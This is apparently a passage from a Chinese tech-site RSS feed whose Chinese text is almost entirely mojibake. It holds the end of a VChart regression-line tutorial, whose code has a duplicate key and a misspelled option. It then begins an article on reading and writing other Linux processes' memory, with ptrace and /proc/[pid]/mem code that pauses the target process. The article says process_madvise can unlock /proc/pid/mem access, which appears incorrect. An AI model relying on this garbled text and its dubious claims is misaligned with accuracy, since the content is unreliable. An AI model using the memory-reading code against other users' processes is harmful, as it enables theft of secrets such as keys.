<p><code>type</code>: æŒ‡å®šå›å½’ç±»å‹ã€‚ä¾‹å¦‚ï¼Œåœ¨æ•£ç‚¹å›¾ä¸­å¯é€‰ <code>'linear'</code>, <code>'polynomial'</code>, <code>'logarithmic'</code>, <code>'exponential'</code>, <code>'loess'</code>ã€‚åœ¨ç›´æ–¹å›¾ä¸­å¯é€‰ <code>'kde'</code>, <code>'ecdf'</code>ã€‚</p>
</li>
<li>
<p><code>degree</code> (æˆ– <code>polynomialDegree</code>): å½“ <code>type</code> ä¸º <code>'polynomial'</code> æ—¶ï¼Œç”¨äºæŒ‡å®šå¤šé¡¹å¼çš„é˜¶æ•°ï¼Œé»˜è®¤ä¸º 2ã€‚é˜¶æ•°è¶Šé«˜ï¼Œæ›²çº¿è¶Šèƒ½æ‹Ÿåˆæ•°æ®çš„æ³¢åŠ¨ï¼Œä½†æœ‰è¿‡æ‹Ÿåˆçš„é£é™©ã€‚</p>
</li>
<li>
<p><code>line</code>: ç”¨äºé…ç½®å›å½’çº¿çš„æ ·å¼ï¼Œå¦‚ <code>style</code>ï¼ˆçº¿å‹ã€é¢œè‰²ã€ç²—ç»†ç­‰ï¼‰ã€‚</p>
</li>
<li>
<p><code>label</code>: é…ç½®å›å½’çº¿æœ«ç«¯æˆ–é¡¶éƒ¨çš„å…¬å¼æ ‡ç­¾ï¼Œå¯ä»¥è‡ªå®šä¹‰ <code>text</code> å’Œ <code>style</code>ã€‚</p>
</li>
<li>
<p><code>confidenceInterval</code>: é…ç½®ç½®ä¿¡åŒºé—´ï¼Œé€šè¿‡ <code>visible</code> æ§åˆ¶å…¶æ˜¾éšï¼Œå¹¶é€šè¿‡ <code>style</code> è‡ªå®šä¹‰å…¶å¡«å……æ ·å¼ã€‚</p>
</li>
</ul>
<h3 data-id="heading-7">ç¤ºä¾‹ï¼šæ ·å¼å®šåˆ¶</h3>
<p>ä¸‹é¢çš„ä¾‹å­å°†åœ¨å‰è¿°æ•£ç‚¹å›¾çš„åŸºç¡€ä¸Šï¼Œä¿®æ”¹ <code>type</code> å®ç°3æ¬¡å¤šé¡¹å¼å›å½’çº¿ï¼Œå¹¶è‡ªå®šä¹‰å›å½’çº¿æ ·å¼ã€‚</p>
<pre><code class="hljs language-ts" lang="ts"><span class="hljs-keyword">import</span> { appendScatterRegressionLineConfig } <span class="hljs-keyword">from</span> <span class="hljs-string">'@visactor/vchart-extension'</span>;

<span class="hljs-comment">// å‡è®¾ä½ å·²æœ‰ä¸€ä¸ªåŸºç¡€çš„æ•£ç‚¹å›¾ spec</span>
<span class="hljs-keyword">const</span> spec = {
  <span class="hljs-attr">type</span>: <span class="hljs-string">'scatter'</span>,
  <span class="hljs-attr">data</span>: {
    <span class="hljs-attr">values</span>: [
      { <span class="hljs-attr">name</span>: <span class="hljs-string">'chevrolet chevelle malibu'</span>, <span class="hljs-attr">milesPerGallon</span>: <span class="hljs-number">18</span>, <span class="hljs-attr">cylinders</span>: <span class="hljs-number">8</span>, <span class="hljs-attr">horsepower</span>: <span class="hljs-number">130</span> },
  { <span class="hljs-attr">name</span>: <span class="hljs-string">'buick skylark 320'</span>, <span class="hljs-attr">milesPerGallon</span>: <span class="hljs-number">15</span>, <span class="hljs-attr">cylinders</span>: <span class="hljs-number">8</span>, <span class="hljs-attr">horsepower</span>: <span class="hljs-number">165</span> },
  { <span class="hljs-attr">name</span>: <span class="hljs-string">'plymouth satellite'</span>, <span class="hljs-attr">milesPerGallon</span>: <span class="hljs-number">18</span>, <span class="hljs-attr">cylinders</span>: <span class="hljs-number">8</span>, <span class="hljs-attr">horsepower</span>: <span class="hljs-number">150</span> },
      <span class="hljs-comment">// ... æ›´å¤šæ•°æ®</span>
    ]
  },
  <span class="hljs-attr">xField</span>: <span class="hljs-string">'milesPerGallon'</span>,
  <span class="hljs-attr">yField</span>: <span class="hljs-string">'horsepower'</span>,
};

<span class="hljs-comment">// ä¸º spec æ·»åŠ å›å½’çº¿é…ç½®</span>
<span class="hljs-title function_">appendScatterRegressionLineConfig</span>(spec, {
  <span class="hljs-attr">type</span>: <span class="hljs-string">'polynomial'</span>, <span class="hljs-comment">// æ”¯æŒ4ä¸­ç±»å‹ 'linear' | 'logisitc' | 'lowess' | 'polynomial'</span>
    <span class="hljs-attr">polynomialDegree</span>: <span class="hljs-number">3</span>,
    <span class="hljs-attr">color</span>: <span class="hljs-string">'red'</span>,
    <span class="hljs-attr">line</span>: {
      <span class="hljs-attr">style</span>: {
        <span class="hljs-attr">lineWidth</span>: <span class="hljs-number">2</span>
      }
    },
    <span class="hljs-attr">confidenceInterval</span>: {
      <span class="hljs-attr">style</span>: {
        <span class="hljs-attr">fillOpacity</span>: <span class="hljs-number">0.2</span>
      }
    },
    <span class="hljs-attr">label</span>: {
      <span class="hljs-attr">text</span>: <span class="hljs-string">'3æ¬¡å¤šé¡¹å¼å›å½’'</span>
    }
});

<span class="hljs-comment">// ç°åœ¨ï¼Œspec å°±åŒ…å«äº†å›å½’çº¿é…ç½®ï¼Œå¯ä»¥ç”¨äº VChart æ¸²æŸ“äº†</span>
<span class="hljs-keyword">const</span> vchart = <span class="hljs-keyword">new</span> <span class="hljs-title class_">VChart</span>(spec, { <span class="hljs-attr">dom</span>: <span class="hljs-string">'chart-container'</span> });
vchart.<span class="hljs-title function_">renderSync</span>();
    

</code></pre>
<p><img src="https://p6-xtjj-sign.byteimg.com/tos-cn-i-73owjymdk6/49d83a91e6de469d962a1b96aae2e030~tplv-73owjymdk6-jj-mark-v1:0:0:0:0:5o6Y6YeR5oqA5pyv56S-5Yy6IEAg546E6a2C:q75.awebp?rk3s=f64ab15b&amp;x-expires=1765768615&amp;x-signature=ga%2FlX66KE3pKHI0s5DOLXLmvBYg%3D" alt="image.png" loading="lazy"/></p>
<h3 data-id="heading-8">ç¤ºä¾‹ï¼šç›´æ–¹å›¾ä¸æ ¸å¯†åº¦ä¼°è®¡ï¼ˆKDEï¼‰</h3>
<p>å›å½’çº¿æ‰©å±•åŒæ ·èƒ½å¢å¼ºç›´æ–¹å›¾çš„è¡¨ç°åŠ›ã€‚é€šè¿‡å åŠ  KDE æ›²çº¿ï¼Œå¯ä»¥æ›´å¹³æ»‘åœ°è§‚å¯Ÿæ•°æ®åˆ†å¸ƒçš„â€œå½¢çŠ¶â€ã€‚</p>
<pre><code class="hljs language-ts" lang="ts"><span class="hljs-comment">// è¿™æ˜¯ä¸€ä¸ªåŒ…å« bin è½¬æ¢çš„ç›´æ–¹å›¾ spec</span>
<span class="hljs-keyword">const</span> spec = {
  <span class="hljs-attr">type</span>: <span class="hljs-string">'histogram'</span>,
  <span class="hljs-attr">data</span>: { <span class="hljs-comment">/* ... */</span> },
  <span class="hljs-attr">type</span>: <span class="hljs-string">'histogram'</span>,
  <span class="hljs-attr">xField</span>: <span class="hljs-string">'x0'</span>,
  <span class="hljs-attr">x2Field</span>: <span class="hljs-string">'x1'</span>,
  <span class="hljs-attr">yField</span>: <span class="hljs-string">'frequency'</span>,
};

<span class="hljs-comment">// ä¸ºå…¶é™„åŠ  KDE æ›²çº¿</span>
<span class="hljs-title function_">appendHistogramRegressionLineConfig</span>(spec, [
  {
    <span class="hljs-attr">type</span>: <span class="hljs-string">'kde'</span>, <span class="hljs-comment">// æ”¯æŒ 'kde' å’Œ 'ecdf'</span>
    <span class="hljs-attr">line</span>: {
      <span class="hljs-attr">style</span>: {
        <span class="hljs-attr">stroke</span>: <span class="hljs-string">'red'</span>,
        <span class="hljs-attr">lineWidth</span>: <span class="hljs-number">2</span>
      }
    },
    <span class="hljs-attr">label</span>: {
      <span class="hljs-attr">text</span>: <span class="hljs-string">'KDEæ ¸å¯†åº¦ä¼°è®¡'</span>
    }
  },
  {
    <span class="hljs-attr">type</span>: <span class="hljs-string">'ecdf'</span>, <span class="hljs-comment">// æ”¯æŒ 'kde' å’Œ 'ecdf'</span>
    <span class="hljs-attr">line</span>: {
      <span class="hljs-attr">style</span>: {
        <span class="hljs-attr">stroke</span>: <span class="hljs-string">'green'</span>,
        <span class="hljs-attr">lineWidth</span>: <span class="hljs-number">2</span>
      }
    },
    <span class="hljs-attr">label</span>: {
      <span class="hljs-attr">text</span>: <span class="hljs-string">'ç»éªŒç´¯ç§¯åˆ†å¸ƒå‡½æ•°ï¼ˆECDFï¼‰'</span>
    }
  }
]);
    

</code></pre>
<p><img src="https://p6-xtjj-sign.byteimg.com/tos-cn-i-73owjymdk6/fe1dcfe19af24df5ba7cca18305dc6d3~tplv-73owjymdk6-jj-mark-v1:0:0:0:0:5o6Y6YeR5oqA5pyv56S-5Yy6IEAg546E6a2C:q75.awebp?rk3s=f64ab15b&amp;x-expires=1765768615&amp;x-signature=rIXMhzNWyjDck20z6Ws%2BuwC5Zvg%3D" alt="image.png" loading="lazy"/></p>
<h3 data-id="heading-9">åœ¨çº¿demoå’Œæ•™ç¨‹</h3>
<p>demoï¼š <a href="https://link.juejin.cn?target=https%3A%2F%2Fvisactor.com%2Fvchart%2Fdemo%2Fscatter-chart%2Fscatter-regression-line" target="_blank" title="https://visactor.com/vchart/demo/scatter-chart/scatter-regression-line" ref="nofollow noopener noreferrer">visactor.com/vchart/demoâ€¦</a></p>
<p>æ•™ç¨‹ï¼š <a href="https://link.juejin.cn?target=https%3A%2F%2Fvisactor.com%2Fvchart%2Fguide%2Ftutorial_docs%2FChart_Extensions%2Fregression_line" target="_blank" title="https://visactor.com/vchart/guide/tutorial_docs/Chart_Extensions/regression_line" ref="nofollow noopener noreferrer">visactor.com/vchart/guidâ€¦</a></p>
<h3 data-id="heading-10">æ¬¢è¿äº¤æµ</h3>
<p>æœ€åï¼Œæˆ‘ä»¬è¯šæŒšçš„æ¬¢è¿æ‰€æœ‰å¯¹æ•°æ®å¯è§†åŒ–æ„Ÿå…´è¶£çš„æœ‹å‹å‚ä¸è¿›æ¥ï¼Œå‚ä¸ VisActor çš„å¼€æºå»ºè®¾ï¼š</p>
<p><strong>VTable</strong>ï¼š<a href="https://link.juejin.cn?target=https%3A%2F%2Fwww.visactor.io%2Fvtable" target="_blank" title="https://link.juejin.cn?target=https%3A%2F%2Fwww.visactor.io%2Fvtable">VTable å®˜ç½‘</a>ã€<a href="https://link.juejin.cn?target=https%3A%2F%2Fgithub.com%2FVisActor%2FVTable" target="_blank" title="https://link.juejin.cn?target=https%3A%2F%2Fgithub.com%2FVisActor%2FVTable">VTable Githubï¼ˆæ¬¢è¿ Starï¼‰</a></p>
<p>VisActor å®˜æ–¹ç½‘ç«™ï¼š<a href="https://link.juejin.cn?target=http%3A%2F%2Fwww.visactor.io%2F" target="_blank" title="https://link.juejin.cn?target=http%3A%2F%2Fwww.visactor.io%2F">www.visactor.io/</a> æˆ– <a href="https://link.juejin.cn?target=http%3A%2F%2Fwww.viactor.com" target="_blank" title="https://link.juejin.cn?target=http%3A%2F%2Fwww.viactor.com">www.viactor.com</a></p>
<p>Discordï¼š<a href="https://link.juejin.cn?target=http%3A%2F%2Fdiscord.gg%2F3wPyxVyH6m" target="_blank" title="https://link.juejin.cn?target=http%3A%2F%2Fdiscord.gg%2F3wPyxVyH6m">discord.gg/3wPyxVyH6m</a></p>
<p>é£ä¹¦ç¾¤ï¼ˆå¤–ç½‘ï¼‰ï¼š<a href="https://link.juejin.cn?target=https%3A%2F%2Fp3-juejin.byteimg.com%2Ftos-cn-i-k3u1fbpfcp%2F40dcf4e6722d4925804361a2269991d8~tplv-k3u1fbpfcp-jj-mark%3A0%3A0%3A0%3A0%3Aq75.image%23%3Fw%3D264%26h%3D277%26s%3D35808%26e%3Dpng%26b%3Dfdfdfd" target="_blank" title="https://link.juejin.cn?target=https%3A%2F%2Fp3-juejin.byteimg.com%2Ftos-cn-i-k3u1fbpfcp%2F40dcf4e6722d4925804361a2269991d8~tplv-k3u1fbpfcp-jj-mark%3A0%3A0%3A0%3A0%3Aq75.image%23%3Fw%3D264%26h%3D277%26s%3D35808%26e%3Dpng%26b%3Dfdfdfd">æ‰“å¼€é“¾æ¥æ‰«ç </a></p>
<p>å¾®ä¿¡å…¬ä¼—å·ï¼š<a href="https://link.juejin.cn?target=https%3A%2F%2Fp3-juejin.byteimg.com%2Ftos-cn-i-k3u1fbpfcp%2Ff28519302ee94940a8159fc52d375aaa~tplv-k3u1fbpfcp-jj-mark%3A0%3A0%3A0%3A0%3Aq75.image%23%3Fw%3D258%26h%3D258%26s%3D8552%26e%3Dwebp%26b%3Dfefefe" target="_blank" title="https://link.juejin.cn?target=https%3A%2F%2Fp3-juejin.byteimg.com%2Ftos-cn-i-k3u1fbpfcp%2Ff28519302ee94940a8159fc52d375aaa~tplv-k3u1fbpfcp-jj-mark%3A0%3A0%3A0%3A0%3Aq75.image%23%3Fw%3D258%26h%3D258%26s%3D8552%26e%3Dwebp%26b%3Dfefefe">æ‰“å¼€é“¾æ¥æ‰«ç </a></p>
<p>githubï¼š<a href="https://link.juejin.cn?target=https%3A%2F%2Fgithub.com%2FVisActor%2F" target="_blank" title="https://link.juejin.cn?target=https%3A%2F%2Fgithub.com%2FVisActor%2F">github.com/VisActor</a></p></div></div></article> <div class="article-end" data-v-539963b4="" data-v-61fb5e44=""><div class="rank-entry-bottom" data-v-539963b4="" data-v-61fb5e44=""><!----></div> <div class="tag-list-box" data-v-539963b4="" data-v-61fb5e44=""><!----><!----><!----></div></div> <!----><!----><!----><!----><!----><style>	.markdown-body { color: #828182;}</style>]]></description></item><item>    <title><![CDATA[Linux è·¨è¿›ç¨‹å†…å­˜æ“ä½œï¼šä¸‰ç§å®æˆ˜æ–¹æ³•ä¸æ”»é˜²æ€è€ƒ]]></title>    <link>https://juejin.cn/post/7580753790771314730</link>    <guid>https://juejin.cn/post/7580753790771314730</guid>    <pubDate>2025-12-08T03:15:14.000Z</pubDate>    <description><![CDATA[<article itemscope="itemscope" itemtype="http://schema.org/Article" data-entry-id="7580753790771314730" data-draft-id="7580753790771298346" data-original-type="0" class="article" data-v-61fb5e44=""><!----> <meta itemprop="headline" content="Linux è·¨è¿›ç¨‹å†…å­˜æ“ä½œï¼šä¸‰ç§å®æˆ˜æ–¹æ³•ä¸æ”»é˜²æ€è€ƒ"/> <meta itemprop="keywords" content="å®‰å…¨"/> <meta itemprop="datePublished" content="2025-12-08T03:15:14.000Z"/> <meta itemprop="image" content="https://p1-jj.byteimg.com/tos-cn-i-t2oaga2asx/gold-assets/icon/icon-128.png~tplv-t2oaga2asx-image.image"/> <div itemprop="author" itemscope="itemscope" itemtype="http://schema.org/Person"><meta itemprop="name" content="æ·±ç›¾å®‰å…¨"/> <meta itemprop="url" content="https://juejin.cn/user/741508014680712"/></div> <div itemprop="publisher" itemscope="itemscope" itemtype="http://schema.org/Organization"><meta itemprop="name" content="æ˜é‡‘"/> <div itemprop="logo" itemscope="itemscope" itemtype="https://schema.org/ImageObject"><meta itemprop="url" content="https://p1-jj.byteimg.com/tos-cn-i-t2oaga2asx/gold-assets/icon/icon-white-180.png~tplv-t2oaga2asx-image.image"/> <meta itemprop="width" content="180"/> <meta itemprop="height" content="180"/></div></div> <h1 class="article-title" data-v-61fb5e44="">
            Linux è·¨è¿›ç¨‹å†…å­˜æ“ä½œï¼šä¸‰ç§å®æˆ˜æ–¹æ³•ä¸æ”»é˜²æ€è€ƒ
            <!----> <!----></h1> <div class="author-info-block block-hidden" data-v-61fb5e44=""><div class="author-info-box" data-v-61fb5e44=""><div class="author-name" data-v-61fb5e44=""><a href="/user/741508014680712/posts" target="_blank" rel="" class="jj-link username username ellipsis" data-v-65b50b51="" data-v-292f6e48="" data-v-61fb5e44=""><span class="name" style="max-width:160px;" data-v-65b50b51="" data-v-292f6e48="">
    æ·±ç›¾å®‰å…¨
  </span> <!----> <!----> <!----> </a></div> <div class="meta-box" data-v-61fb5e44=""><time datetime="2025-12-08T03:15:14.000Z" title="Mon Dec 08 2025 03:15:14 GMT+0000 (Coordinated Universal Time)" class="time" data-v-61fb5e44="">
                    2025-12-08
                  </time> <svg width="16" height="16" viewbox="0 0 16 16" fill="none" xmlns="http://www.w3.org/2000/svg" class="read-icon" data-v-61fb5e44=""><path d="M7.90078 2.80078C4.49278 2.80078 1.74745 6.11672 0.800781 7.77469C1.74745 9.58339 4.49278 13.2008 7.90078 13.2008C11.3088 13.2008 14.0541 9.58339 15.0008 7.77469C14.0541 6.11672 11.3088 2.80078 7.90078 2.80078Z" stroke="currentColor" data-v-61fb5e44=""/><circle cx="7.89922" cy="8.00078" r="2.2" stroke="currentColor" data-v-61fb5e44=""/></svg> <span class="views-count" data-v-61fb5e44="">
                    0
                  </span> <span class="read-time" data-v-61fb5e44=""><svg width="16" height="16" viewbox="0 0 16 16" fill="none" xmlns="http://www.w3.org/2000/svg" data-v-61fb5e44=""><rect width="16" height="16" fill="none" data-v-61fb5e44=""/><circle cx="8" cy="8" r="5.65625" stroke="#8A919F" data-v-61fb5e44=""/><path d="M7.69141 5.18652V8.30924H10.8141" stroke="#8A919F" stroke-linecap="round" stroke-linejoin="round" data-v-61fb5e44=""/></svg>
                    é˜…è¯»5åˆ†é’Ÿ
                  </span> <!----></div></div> <div style="flex:1;" data-v-61fb5e44=""/> <!----> <!----></div> <!----> <!----> <!----> <!----> <div id="article-root" itemprop="articleBody" class="main" data-v-61fb5e44=""><div class="article-viewer markdown-body result"><style>.markdown-body{word-break:break-word;line-height:1.75;font-weight:400;font-size:16px;overflow-x:hidden;color:#252933}.markdown-body h1,.markdown-body h2,.markdown-body h3,.markdown-body h4,.markdown-body h5,.markdown-body h6{line-height:1.5;margin-top:35px;margin-bottom:10px;padding-bottom:5px}.markdown-body h1{font-size:24px;line-height:38px;margin-bottom:5px}.markdown-body h2{font-size:22px;line-height:34px;padding-bottom:12px;border-bottom:1px solid #ececec}.markdown-body h3{font-size:20px;line-height:28px}.markdown-body h4{font-size:18px;line-height:26px}.markdown-body h5{font-size:17px;line-height:24px}.markdown-body h6{font-size:16px;line-height:24px}.markdown-body p{line-height:inherit;margin-top:22px;margin-bottom:22px}.markdown-body img{max-width:100%}.markdown-body hr{border:none;border-top:1px solid #ddd;margin-top:32px;margin-bottom:32px}.markdown-body code{word-break:break-word;border-radius:2px;overflow-x:auto;background-color:#fff5f5;color:#ff502c;font-size:.87em;padding:.065em .4em}.markdown-body code,.markdown-body pre{font-family:Menlo,Monaco,Consolas,Courier New,monospace}.markdown-body pre{overflow:auto;position:relative;line-height:1.75}.markdown-body pre&gt;code{font-size:12px;padding:15px 12px;margin:0;word-break:normal;display:block;overflow-x:auto;color:#333;background:#f8f8f8}.markdown-body a{text-decoration:none;color:#0269c8;border-bottom:1px solid #d1e9ff}.markdown-body a:active,.markdown-body a:hover{color:#275b8c}.markdown-body table{display:inline-block!important;font-size:12px;width:auto;max-width:100%;overflow:auto;border:1px solid #f6f6f6}.markdown-body thead{background:#f6f6f6;color:#000;text-align:left}.markdown-body tr:nth-child(2n){background-color:#fcfcfc}.markdown-body td,.markdown-body th{padding:12px 7px;line-height:24px}.markdown-body td{min-width:120px}.markdown-body blockquote{color:#666;padding:1px 23px;margin:22px 0;border-left:4px solid #cbcbcb;background-color:#f8f8f8}.markdown-body blockquote:after{display:block;content:""}.markdown-body blockquote&gt;p{margin:10px 0}.markdown-body ol,.markdown-body ul{padding-left:28px}.markdown-body ol li,.markdown-body ul li{margin-bottom:0;list-style:inherit}.markdown-body ol li .task-list-item,.markdown-body ul li .task-list-item{list-style:none}.markdown-body ol li .task-list-item ol,.markdown-body ol li .task-list-item ul,.markdown-body ul li .task-list-item ol,.markdown-body ul li .task-list-item ul{margin-top:0}.markdown-body ol ol,.markdown-body ol ul,.markdown-body ul ol,.markdown-body ul ul{margin-top:3px}.markdown-body ol li{padding-left:6px}.markdown-body .contains-task-list{padding-left:0}.markdown-body .task-list-item{list-style:none}@media (max-width:720px){.markdown-body h1{font-size:24px}.markdown-body h2{font-size:20px}.markdown-body h3{font-size:18px}}</style><style data-highlight="" data-highlight-key="juejin">.markdown-body pre,.markdown-body pre&gt;code.hljs{color:#333;background:#f8f8f8}.hljs-comment,.hljs-quote{color:#998;font-style:italic}.hljs-keyword,.hljs-selector-tag,.hljs-subst{color:#333;font-weight:700}.hljs-literal,.hljs-number,.hljs-tag .hljs-attr,.hljs-template-variable,.hljs-variable{color:teal}.hljs-doctag,.hljs-string{color:#d14}.hljs-section,.hljs-selector-id,.hljs-title{color:#900;font-weight:700}.hljs-subst{font-weight:400}.hljs-class .hljs-title,.hljs-type{color:#458;font-weight:700}.hljs-attribute,.hljs-name,.hljs-tag{color:navy;font-weight:400}.hljs-link,.hljs-regexp{color:#009926}.hljs-bullet,.hljs-symbol{color:#990073}.hljs-built_in,.hljs-builtin-name{color:#0086b3}.hljs-meta{color:#999;font-weight:700}.hljs-deletion{background:#fdd}.hljs-addition{background:#dfd}.hljs-emphasis{font-style:italic}.hljs-strong{font-weight:700}</style><p>ä½ çš„è¿›ç¨‹å†…å­˜ï¼ŒçœŸçš„å®‰å…¨å—ï¼Ÿ</p>
<p>å½“ä½ è¿è¡Œä¸€ä¸ªç¨‹åºæ—¶ï¼Œå®ƒçš„å†…å­˜æ•°æ®â€”â€”ä»ç”¨æˆ·è¾“å…¥åˆ°åŠ å¯†å¯†é’¥â€”â€”å¯¹å…¶ä»–è¿›ç¨‹æ¥è¯´å¯èƒ½å°±åƒä¸€æœ¬æ‘Šå¼€çš„ä¹¦ã€‚ä»Šå¤©æˆ‘ä»¬ä¸èŠç†è®ºï¼Œç›´æ¥æ‹†è§£ä¸‰ç§åœ¨ Linux ä¸‹è¯»å†™å…¶ä»–è¿›ç¨‹å†…å­˜çš„ç¡¬æ ¸æŠ€æœ¯ï¼Œæœ€åèŠèŠè¿™äº›å¹´æˆ‘åœ¨é˜²æŠ¤æ–¹æ¡ˆä¸Šè¸©è¿‡çš„å‘ã€‚</p>
<h2 data-id="heading-0">ptraceï¼šè€è€Œå¼¥åšçš„è°ƒè¯•ç¥å™¨</h2>
<p>ptrace æ˜¯ Linux ç³»ç»Ÿè°ƒç”¨çš„"ç‘å£«å†›åˆ€"ï¼Œgdbã€strace è¿™äº›å·¥å…·åº•å±‚éƒ½æ˜¯å®ƒåœ¨æ”¯æ’‘ã€‚å®ƒçš„å¨åŠ›åœ¨äºèƒ½å®Œå…¨æ§åˆ¶ç›®æ ‡è¿›ç¨‹çš„æ‰§è¡Œæµï¼Œä½†è¿™æŠŠåˆ€æœ‰ä¸ªè‡´å‘½å¼±ç‚¹ï¼š<strong>æ…¢</strong>ã€‚</p>
<h3 data-id="heading-1">æ ¸å¿ƒæœºåˆ¶</h3>
<pre><code class="hljs language-cpp" lang="cpp"><span class="hljs-comment">// ç²¾ç®€åçš„æ ¸å¿ƒå®ç°ï¼Œå»æ‰äº†ç¹ççš„é”™è¯¯å¤„ç†</span>
<span class="hljs-function"><span class="hljs-type">long</span> <span class="hljs-title">ptrace</span><span class="hljs-params">(PTRACE_PEEKDATA, pid, addr, <span class="hljs-literal">nullptr</span>)</span></span>;  <span class="hljs-comment">// è¯»</span>
<span class="hljs-function"><span class="hljs-type">long</span> <span class="hljs-title">ptrace</span><span class="hljs-params">(PTRACE_POKEDATA, pid, addr, data)</span></span>;     <span class="hljs-comment">// å†™</span>
</code></pre>
<p>æ¯æ¬¡åªèƒ½è¯»å†™ä¸€ä¸ª <code>long</code> ç±»å‹æ•°æ®ï¼Œå¤§æ‰¹é‡æ“ä½œå°±æ˜¯å™©æ¢¦ã€‚æ›´è¦å‘½çš„æ˜¯ï¼Œ<strong>ç›®æ ‡è¿›ç¨‹å¿…é¡»å¤„äº STOP çŠ¶æ€</strong>ï¼Œè¿™æ„å‘³ç€ä½ å¾—ä¸åœåœ°å‘ SIGSTOP/SIGCONT ä¿¡å·ï¼ŒåƒæŒ‰é¥æ§å™¨ä¸€æ ·æ§åˆ¶å¯¹æ–¹ã€‚å®æˆ˜ä¸­ï¼Œè¿™ç§é¢‘ç¹ä¸­æ–­ä¼šè®©ç›®æ ‡è¿›ç¨‹å¡é¡¿æ˜æ˜¾ï¼Œå®¹æ˜“è¢«å¯Ÿè§‰ã€‚</p>
<p>çœ‹çœ‹è¿™æ®µè¯»å†™å†…å­˜çš„ä»£ç ä½ å°±æ˜ç™½äº†ï¼š</p>
<pre><code class="hljs language-cpp" lang="cpp"><span class="hljs-function"><span class="hljs-type">size_t</span> <span class="hljs-title">Tracer::readMemory</span><span class="hljs-params">(<span class="hljs-type">uintptr_t</span> addr, <span class="hljs-type">void</span>* buf, <span class="hljs-type">size_t</span> size)</span> </span>{
    <span class="hljs-type">size_t</span> done = <span class="hljs-number">0</span>;
    <span class="hljs-type">long</span> tmp;
    
    <span class="hljs-comment">// ä¸€æ¬¡è¯»ä¸€ä¸ª wordï¼Œå¾ªç¯åˆ°å¤©è’åœ°è€</span>
    <span class="hljs-keyword">while</span>(done &lt; size) {
        tmp = <span class="hljs-built_in">ptrace</span>(PTRACE_PEEKDATA, pid_, (<span class="hljs-type">void</span>*)addr, <span class="hljs-literal">nullptr</span>);
        <span class="hljs-built_in">memcpy</span>((<span class="hljs-type">uint8_t</span>*)buf + done, &amp;tmp, <span class="hljs-built_in">sizeof</span>(tmp));
        addr += <span class="hljs-built_in">sizeof</span>(tmp);
        done += <span class="hljs-built_in">sizeof</span>(tmp);
    }
    <span class="hljs-keyword">return</span> done;
}
</code></pre>
<p><strong>å®æˆ˜å»ºè®®</strong>ï¼šptrace é€‚åˆå°æ•°æ®é‡ã€éœ€è¦ç²¾ç¡®æ§åˆ¶çš„åœºæ™¯ï¼Œæ¯”å¦‚ä¿®æ”¹æŸä¸ªå…³é”®è·³è½¬æŒ‡ä»¤ã€‚å¤§æ•°æ®é‡è¿˜æ˜¯åˆ«æŠ˜è…¾äº†ï¼Œä½ ä¼šåæ‚”çš„ã€‚</p>
<h2 data-id="heading-2">/proc/[pid]/memï¼šç›´æ¥æ“ä½œå†…å­˜çš„é»‘ç§‘æŠ€</h2>
<p>ç›¸æ¯” ptrace çš„"æ–‡æ˜"æ–¹å¼ï¼Œ/proc/pid/mem å°±æ˜¯ç›´æ¥ç ´é—¨è€Œå…¥ã€‚è¿™ä¸ªè™šæ‹Ÿæ–‡ä»¶æš´éœ²äº†è¿›ç¨‹çš„æ•´ä¸ªåœ°å€ç©ºé—´ï¼Œä½ å¯ä»¥ç”¨æ ‡å‡†çš„ <code>read/write</code> ç³»ç»Ÿè°ƒç”¨æ¥æ“ä½œï¼Œæ•ˆç‡ç”© ptrace å‡ æ¡è¡—ã€‚</p>
<h3 data-id="heading-3">å®ç°ç²¾å</h3>
<pre><code class="hljs language-cpp" lang="cpp"><span class="hljs-function"><span class="hljs-type">bool</span> <span class="hljs-title">ProcFile::openMemory</span><span class="hljs-params">()</span> </span>{
    <span class="hljs-type">char</span> path[<span class="hljs-number">64</span>];
    <span class="hljs-built_in">snprintf</span>(path, <span class="hljs-built_in">sizeof</span>(path), <span class="hljs-string">"/proc/%d/mem"</span>, pid_);
    <span class="hljs-keyword">return</span> (mem_fd_ = <span class="hljs-built_in">open</span>(path, O_RDWR)) != <span class="hljs-number">-1</span>;  <span class="hljs-comment">// æ‹¿åˆ°æ–‡ä»¶æè¿°ç¬¦</span>
}

<span class="hljs-function"><span class="hljs-type">size_t</span> <span class="hljs-title">ProcFile::readMemory</span><span class="hljs-params">(<span class="hljs-type">intptr_t</span> addr, <span class="hljs-type">void</span>* buf, <span class="hljs-type">size_t</span> size)</span> </span>{
    <span class="hljs-built_in">kill</span>(pid_, SIGSTOP);           <span class="hljs-comment">// è¿˜æ˜¯å¾—åœï¼Œä½†åªåœä¸€æ¬¡</span>
    <span class="hljs-built_in">lseek</span>(mem_fd_, addr, SEEK_SET);
    <span class="hljs-type">size_t</span> bytes = <span class="hljs-built_in">read</span>(mem_fd_, buf, size);
    <span class="hljs-built_in">kill</span>(pid_, SIGCONT);
    <span class="hljs-keyword">return</span> bytes;
}
</code></pre>
<p>çœ‹åˆ°åŒºåˆ«äº†å—ï¼Ÿ<strong>ä¸€æ¬¡ç³»ç»Ÿè°ƒç”¨å°±èƒ½è¯»ä¸€å¤§å—å†…å­˜</strong>ï¼Œä¸ç”¨å¾ªç¯ã€‚æ€§èƒ½æ•æ„Ÿå‹åº”ç”¨æ›´åçˆ±è¿™ç§æ–¹æ³•ã€‚ä½†æ³¨æ„ï¼Œå†…æ ¸ä» 3.2 ç‰ˆæœ¬å¼€å§‹æ”¶ç´§äº†æƒé™ï¼Œç›´æ¥æ‰“å¼€ä¼šå¤±è´¥ï¼Œé™¤éä½ é€šè¿‡ <code>process_madvise</code> ç­‰ç‰¹æ®Šæ‰‹æ®µè·å–è®¿é—®æƒé™ã€‚</p>
<p><strong>è¸©å‘è®°å½•</strong>ï¼šå¾ˆå¤šæ–°æ‰‹ä»¥ä¸ºæ‰“å¼€ /proc/pid/mem å°±ä¸‡äº‹å¤§å‰ï¼Œç»“æœåœ¨ <code>lseek</code> æˆ– <code>read</code> æ—¶æ‰å‘ç°æƒé™ä¸è¶³ã€‚è®°ä½ï¼Œè¿™ä¸ªæ–‡ä»¶çš„å®é™…è®¿é—®æ§åˆ¶æ¯”æ–‡ä»¶æƒé™ä½å¤æ‚å¾—å¤šã€‚</p>
<h2 data-id="heading-4">process_vm_readvï¼šå†…æ ¸äº²å„¿å­API</h2>
